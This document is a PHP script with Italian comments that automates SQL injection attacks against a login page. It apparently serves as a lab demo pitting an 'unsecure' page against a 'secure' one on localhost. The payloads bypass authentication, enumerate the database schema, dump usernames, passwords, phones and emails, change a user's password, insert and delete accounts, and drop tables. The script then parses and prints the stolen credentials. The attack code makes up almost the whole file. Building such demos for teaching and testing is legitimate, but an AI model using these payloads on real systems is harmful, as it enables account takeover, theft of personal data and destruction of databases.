<?php
function print_color($text, $color) {
    $colors = [
        'red' => "\033[31m",
        'green' => "\033[32m",
        'yellow' => "\033[33m",
        'cyan' => "\033[36m",
        'white' => "\033[37m"
    ];
    echo $colors[$color] . $text . "\033[0m";
}

$target = "http://localhost:8080/unsecure.php";
// $target = "http://localhost:8080/secure.php";
$table_dropped = false;
$secure_site = false;
$manual_mode = false;

$payloads = [
    ["' OR 1=1; --", "Classico Attacco SQL Injection"], // siccome ritorna sempre True e toglie la password prende tutta la tabella del login
    ["admin' -- ", "Esegue l'accesso dell'admin senza la password"], // fa l'accesso dell'admin senza la password
    ["' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()-- -", "Stampa le tabelle del database"], // per conoscere le varie tabelle
    ["' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='unsecure_users' AND table_schema=DATABASE()-- -", "Stampa le colonne della tabella users"], // per conoscere la tabella users
    ["' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='unsecure_contacts' AND table_schema=DATABASE()-- -", "Stampa le colonne della tabella contacts"], // per conoscere la tabella contacts
    ["' UNION SELECT id, username, password FROM unsecure_users-- -", "Stampa la tabella users"], // stampa la tabella users
    ["' UNION SELECT user_id, telefono, email FROM unsecure_contacts-- -", "Stampa la tabella contacts"], // stampa la tabella contacts
    ["'; UPDATE unsecure_users SET password='123456' WHERE username='anna.neri'; SELECT * FROM unsecure_users; -- ", "Cambia la password di 'anna.neri' in '123456'"], // cambia password ad un utente
    ["'; INSERT INTO unsecure_users (username, password) VALUES ('testuser', 'test1234!'); SELECT * FROM unsecure_users; --", "Inserisce un nuovo utente 'testuser' con password 'test1234!'"], // inserisce un nuovo utente
    ["'; DELETE FROM unsecure_users WHERE username='mario.rossi'; SELECT * FROM unsecure_users; --", "Elimina l'utente 'mario.rossi'"], // elimina un utente
    ["'; DROP TABLE unsecure_contacts; DROP TABLE unsecure_users; --", "Elimina la tabella users e contacts"], // elimina l'intera tabella users
    ["' OR 1=1; --", "Controllo del DROP TABLE"]
];

// scelta del sito
$check_choice = false;
while (!$check_choice) {
    echo "\nScegli sito da testare:\n";
    echo "1) Sito non sicuro\n";
    echo "2) Sito sicuro\n";
    $choice = readline("Inserisci la tua scelta: ");
    switch ($choice) {
        case '1':
            $target = "http://localhost:8080/unsecure.php";
            $check_choice = true;
            break;
        case '2':
            $target = "http://localhost:8080/secure.php";
            $secure_site = true;
            $check_choice = true;
            break;
        default:
            echo "Scelta non valida\n";
    }
}

// scelta della modalità di esecuzione
$check_choice = false;
while (!$check_choice) {
    echo "\nScegli modalità di esecuzione:\n";
    echo "1) Modalità automatica\n";
    echo "2) Modalità manuale\n";
    $choice = readline("Inserisci la tua scelta: ");
    switch ($choice) {
        case '1':
            $check_choice = true;
            break;
        case '2':
            $check_choice = true;
            $manual_mode = true;
            break;
        default:
            echo "Scelta non valida\n";
    }
}


// controllo del DB
$server_ready = false;
$check_url = "$target?username=test&password=test";
for ($i = 0; $i < 30; $i++) { // prova a connettersi al server per 30 secondi
    $response = @file_get_contents($check_url);
    if ($response !== false && strpos($response, 'DB Offline') === false) {
        $server_ready = true;
        break;
    }
    print_color("Attesa connessione al server (tentativo " . ($i+1) . ")\n", "yellow");
    sleep(1); // attende 1 secondo prima di riprovare
}

if (!$server_ready) {
    print_color("Errore: Impossibile connettersi al server\n", "red");
    exit(1);
}

// inizio attacco con payload
print_color("Server online\nInizio test su target: $target\n", "green");

foreach ($payloads as $payload_data) {
    
    print_color("\n--------------------------------------------------------------------------\n", "cyan");
    $payload = $payload_data[0];
    if ($secure_site) { // cambia il nome delle tabelle
        $payload = str_replace("unsecure_users", "secure_users", $payload);
        $payload = str_replace("unsecure_contacts", "secure_contacts", $payload);
    }
    $payload_info = $payload_data[1];

    if ($table_dropped && str_contains($payload, 'users')) { // se la tabella users è già stata eliminata
        print_color("\nSKIPPATO: Tabella users già eliminata\n", "yellow");
        continue;
    }

    $payload_encoded = urlencode($payload);
    $url = "$target?username=$payload_encoded&password=$payload_encoded"; // crea la query da aggiungere all'url

    if ($manual_mode) {
        echo "\nProssimo Payload da eseguire:\n";
        echo "    Payload: $payload\n";
        echo "    Descrizione: $payload_info\n";
        $risposta = readline("Premi [INVIO] per lanciare il payload o digita 'q' per uscire: ");
        
        if (strtolower($risposta) === 'q') {
            print_color("\nEsecuzione interrotta dall'utente.\n", "red");
            break;
        }
    }
    
    print_color("\nTestando: $payload", "green");
    print_color("\nDescrizione: $payload_info\n\n", "cyan");
    $response = @file_get_contents($url); // manda il payload e prende la risposta

    if ($response === false) {
        print_color("Errore connessione\n", "red");
        continue;
    }
    
    // verifica del DROP TABLE
    if (str_contains($payload, 'DROP TABLE')) {
        // ci facciamo stampare tutte le tabelle del DB per vedere se users è ancora li
        //$verify_url = "$target?username=" . urlencode("' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE() -- ") . "&password=tanto_non_serve";
        
        $verify_url = "$target?username=test&password=test"; // provo una richiesta per controllare se c'è ancora la tabella
        $verify_response = @file_get_contents($verify_url); // prende l'output
        if ($verify_response === false || strpos($verify_response, 'mancante o eliminata') !== false) { // se l'output dice che non trova la tabella
            print_color("SUCCESS: Tabelle eliminate con successo\n", "green");
            $table_dropped = true;
        } else {
            print_color("FAIL: Tabelle ancora presenti\n", "red");
        }
        continue;
    }

    // intercetta gli errori ritornati dal sito nella classe "error-row"
    if (preg_match('/<div class="error-row">(.*?)<\/div>/is', $response, $err_match)) {
        $err_msg = trim(strip_tags($err_match[1]));
        print_color("ERRORE SITO: $err_msg\n", "red"); // stampa l'errore
        if (str_contains($err_msg, "mancante o eliminata")) { // se è l'errore della tabella eliminata
            $table_dropped = true; // setta table_dropped a true
        }
        continue;
    }


    // prende i dati ritornati (cioe tutti gli utenti che trova quando riesce a fare l'injection)
    if (preg_match_all('/<div class="success-row">(.*?)<\/div>/is', $response, $matches)) {
        $rows = $matches[1];
        print_color(" * " . count($rows) . " risultato/i trovato/i:\n", "cyan");

        foreach ($rows as $row) {
            // pulisce la riga prendendo solo cio che ci interessa
            $clean = preg_replace('/<strong>.*?<\/strong>/i', '', $row); // toglie <strong>...</strong>
            $clean = trim(html_entity_decode(strip_tags($clean))); // rimuove altri tag
            $cols  = array_map('trim', explode('|', $clean)); // separa le colonne dell'output

            if (str_contains($payload, 'information_schema') || str_contains($payload, 'GROUP_CONCAT')) { // se sono i payload per conoscere le varie tabelle
                print_color("    colonne: $clean\n", "cyan"); // stampa le colonne
            } elseif (str_contains($payload, 'contacts')) { // se è la tabella contacts
                $uid  = $cols[0] ?? '';
                $tel  = $cols[1] ?? '';
                $email = $cols[2] ?? '';
                print_color("    user_id: $uid | telefono: $tel | email: $email\n", "cyan");
            } else { // se è la tabella users
                $id   = $cols[0] ?? '';
                $user = $cols[1] ?? '';
                $pass = $cols[2] ?? '';
                print_color("    id: $id | username: $user | password: $pass\n", "cyan");
            }
        }
    } else {
        print_color("Nessun risultato (credenziali errati o query non ha restituito righe)\n", "red");
    }

}
?>